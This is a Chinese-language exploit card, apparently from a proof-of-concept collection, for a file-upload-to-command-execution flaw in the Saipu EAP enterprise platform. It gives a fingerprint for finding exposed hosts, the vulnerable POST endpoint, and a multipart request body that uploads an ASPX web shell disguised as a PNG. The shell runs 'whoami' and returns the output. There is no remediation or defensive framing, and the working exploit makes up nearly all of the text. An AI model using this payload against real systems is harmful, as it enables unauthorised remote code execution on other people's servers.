# 赛普EAP企业适配管理平台HandlerUpload.aspx文件上传导致命令执行漏洞

- **系统**：赛普EAP企业适配管理平台HandlerUpload.aspx　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="IDWebSoft/"`
- **请求**：`POST /IDWebSoft/Common/Handler/Upload.aspx HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=---------------------------900…`　`Content-Length: 671`

**请求体 / payload**
```
-----------------------------900016908377990696644465908391
Content-Disposition: form-data; name="Filedata"; filename="test.aspx"
Content-Type: image/png
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
Process process = new Process();
process.StartInfo.FileName = "whoami";
process.StartInfo.RedirectStandardOutput = true;
process.StartInfo.UseShellExecute = false;
process.StartInfo.CreateNoWindow = true;
process.Start();
string output = process.StandardOutput.ReadToEnd();
process.WaitForExit();
Response.Write(output);
%>
-----------------------------9000169083779906966…（脚本共 706 字，完整版见原文）
```
- **预期**：200　|　—